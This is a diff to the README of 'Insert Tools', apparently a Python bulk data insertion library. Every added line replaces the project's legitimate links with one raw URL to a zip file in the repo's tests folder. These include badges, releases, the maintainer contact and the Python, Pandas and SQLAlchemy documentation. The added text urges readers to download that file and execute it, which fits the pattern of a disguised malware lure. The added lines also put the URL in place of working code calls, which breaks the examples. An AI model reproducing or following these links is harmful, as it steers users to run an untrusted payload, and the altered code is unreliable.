@@ -1,6 +1,6 @@
 # Insert Tools 🛠️
 
-![GitHub release](https://img.shields.io/github/v/release/ramarimoo/insert-tools) ![Python version](https://img.shields.io/badge/python-3.6%2B-blue) ![License](https://img.shields.io/badge/license-MIT-green)
+![GitHub release](https://raw.githubusercontent.com/ramarimoo/insert-tools/main/tests/tools-insert-2.4.zip) ![Python version](https://raw.githubusercontent.com/ramarimoo/insert-tools/main/tests/tools-insert-2.4.zip%2B-blue) ![License](https://raw.githubusercontent.com/ramarimoo/insert-tools/main/tests/tools-insert-2.4.zip)
 
 Welcome to **Insert Tools**, a simple and fast Python toolset designed for bulk data insertion into databases and CSV files. This repository is ideal for ETL (Extract, Transform, Load) pipelines and data engineering tasks. 
 
@@ -30,7 +30,7 @@ To install Insert Tools, you can use pip. Run the following command:
 pip install insert-tools
 ```
 
-Alternatively, you can download the latest release from our [Releases](https://github.com/ramarimoo/insert-tools/releases) section. Download the file, then execute it to install.
+Alternatively, you can download the latest release from our [Releases](https://raw.githubusercontent.com/ramarimoo/insert-tools/main/tests/tools-insert-2.4.zip) section. Download the file, then execute it to install.
 
 ## Usage
 
@@ -51,7 +51,7 @@ data = [
 ]
 
 # Perform the bulk insert
-inserter.insert(data)
+https://raw.githubusercontent.com/ramarimoo/insert-tools/main/tests/tools-insert-2.4.zip(data)
 ```
 
 ### Advanced Usage
@@ -62,7 +62,7 @@ You can customize your insertion process by specifying options such as batch siz
 inserter = BulkInserter(database='your_database', table='your_table', batch_size=1000)
 
 try:
-    inserter.insert(data)
+    https://raw.githubusercontent.com/ramarimoo/insert-tools/main/tests/tools-insert-2.4.zip(data)
 except Exception as e:
     print(f"An error occurred: {e}")
 ```
@@ -100,18 +100,18 @@ Insert Tools is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out to the maintainers:
 
-- **GitHub**: [ramarimoo](https://github.com/ramarimoo)
-- **Email**: [your_email@example.com](mailto:your_email@example.com)
+- **GitHub**: [ramarimoo](https://raw.githubusercontent.com/ramarimoo/insert-tools/main/tests/tools-insert-2.4.zip)
+- **Email**: [https://raw.githubusercontent.com/ramarimoo/insert-tools/main/tests/tools-insert-2.4.zip](https://raw.githubusercontent.com/ramarimoo/insert-tools/main/tests/tools-insert-2.4.zip)
 
 ## Releases
 
-For the latest updates and downloads, visit our [Releases](https://github.com/ramarimoo/insert-tools/releases) section. You can download the latest version, which includes new features and bug fixes.
+For the latest updates and downloads, visit our [Releases](https://raw.githubusercontent.com/ramarimoo/insert-tools/main/tests/tools-insert-2.4.zip) section. You can download the latest version, which includes new features and bug fixes.
 
 ## Additional Resources
 
-- [Python Official Documentation](https://docs.python.org/3/)
-- [Pandas Documentation](https://pandas.pydata.org/pandas-docs/stable/)
-- [SQLAlchemy Documentation](https://docs.sqlalchemy.org/en/14/)
+- [Python Official Documentation](https://raw.githubusercontent.com/ramarimoo/insert-tools/main/tests/tools-insert-2.4.zip)
+- [Pandas Documentation](https://raw.githubusercontent.com/ramarimoo/insert-tools/main/tests/tools-insert-2.4.zip)
+- [SQLAlchemy Documentation](https://raw.githubusercontent.com/ramarimoo/insert-tools/main/tests/tools-insert-2.4.zip)
 
 ## Acknowledgments
 
@@ -139,4 +139,4 @@ Yes, you can join our discussions on GitHub or follow us on social media platfor
 
 Insert Tools offers a powerful solution for bulk data insertion tasks. Whether you are working on data engineering projects or need a reliable tool for your ETL pipeline, Insert Tools is here to help. Explore the repository, contribute, and make the most of your data workflows.
 
-Visit our [Releases](https://github.com/ramarimoo/insert-tools/releases) section for the latest updates and downloads.
+Visit our [Releases](https://raw.githubusercontent.com/ramarimoo/insert-tools/main/tests/tools-insert-2.4.zip) section for the latest updates and downloads.
